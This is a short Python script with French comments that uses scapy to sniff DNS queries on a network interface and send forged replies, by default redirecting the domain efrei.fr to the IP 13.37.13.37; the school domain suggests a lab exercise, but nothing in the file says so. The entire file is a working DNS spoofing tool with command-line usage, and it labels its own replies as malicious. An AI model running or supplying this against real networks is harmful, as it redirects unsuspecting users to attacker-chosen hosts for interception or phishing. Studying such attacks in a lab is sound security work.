from scapy.all import *
import sys

def spoof_dns(packet, domain, spoofed_ip):
    """
    Intercepte une requête DNS et envoie une réponse falsifiée.
    """
    if packet.haslayer(DNSQR) and domain in packet[DNSQR].qname.decode():
        # Construire la réponse DNS falsifiée
        spoofed_response = (
            IP(dst=packet[IP].src, src=packet[IP].dst) /
            UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) /
            DNS(
                id=packet[DNS].id,
                qr=1,
                aa=1,
                qd=packet[DNS].qd,
                an=DNSRR(rrname=packet[DNSQR].qname, ttl=300, rdata=spoofed_ip)
            )
        )
        send(spoofed_response, verbose=False)
        print(f"[INFO] Réponse malveillante envoyée : {packet[DNSQR].qname.decode()} -> {spoofed_ip}")

def dns_spoof(interface, domain="efrei.fr", spoofed_ip="13.37.13.37"):
    """
    Intercepte les requêtes DNS et répond à celles correspondant au domaine spécifié.
    """
    print(f"[INFO] Spoofing activé pour le domaine {domain} avec l'IP {spoofed_ip} sur l'interface {interface}.")
    try:
        sniff(
            iface=interface,
            filter="udp port 53",
            prn=lambda packet: spoof_dns(packet, domain, spoofed_ip)
        )
    except KeyboardInterrupt:
        print("\n[INFO] Arrêt du spoofing DNS.")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python dns_spoof.py <interface> [domain] [spoofed_ip]")
        sys.exit(1)

    interface = sys.argv[1]
    domain = sys.argv[2] if len(sys.argv) > 2 else "efrei.fr"
    spoofed_ip = sys.argv[3] if len(sys.argv) > 3 else "13.37.13.37"

    dns_spoof(interface, domain, spoofed_ip)